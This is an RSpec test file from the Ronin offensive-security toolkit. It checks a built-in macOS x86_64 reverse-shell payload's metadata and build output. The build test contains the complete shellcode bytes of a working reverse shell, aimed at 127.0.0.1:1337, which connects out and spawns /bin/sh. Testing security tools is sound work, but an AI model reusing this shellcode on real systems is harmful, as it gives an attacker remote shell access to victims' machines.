require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/macos/x86_64/reverse_shell'

describe Ronin::Payloads::Shellcode::MacOS::X86_64::ReverseShell do
  it "must inherit from Ronin::Payloads::Shellcode::ReverseShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::ReverseShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/macos/x86_64/reverse_shell'" do
      expect(subject.id).to eq('shellcode/macos/x86_64/reverse_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86_64" do
      expect(subject.arch).to be(:x86_64)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :macos" do
      expect(subject.os).to be(:macos)
    end
  end

  let(:host) { '127.0.0.1' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x61\x4c\x89\xc0\x48\x31\xd2\x48\x89\xd6\x48\xff\xc6\x48\x89\xf7\x48\xff\xc7\x0f\x05\x49\x89\xc4\x49\xbd\x01\x01\x05\x39\x7f\x00\x00\x01\x41\xb1\xff\x4d\x29\xcd\x41\x55\x49\x89\xe5\x49\xff\xc0\x4c\x89\xc0\x4c\x89\xe7\x4c\x89\xee\x48\x83\xc2\x10\x0f\x05\x49\x83\xe8\x08\x48\x31\xf6\x4c\x89\xc0\x4c\x89\xe7\x0f\x05\x48\x83\xfe\x02\x48\xff\xc6\x76\xef\x49\x83\xe8\x1f\x4c\x89\xc0\x48\x31\xd2\x49\xbd\xff\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xed\x08\x41\x55\x48\x89\xe7\x48\x31\xf6\x0f\x05".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
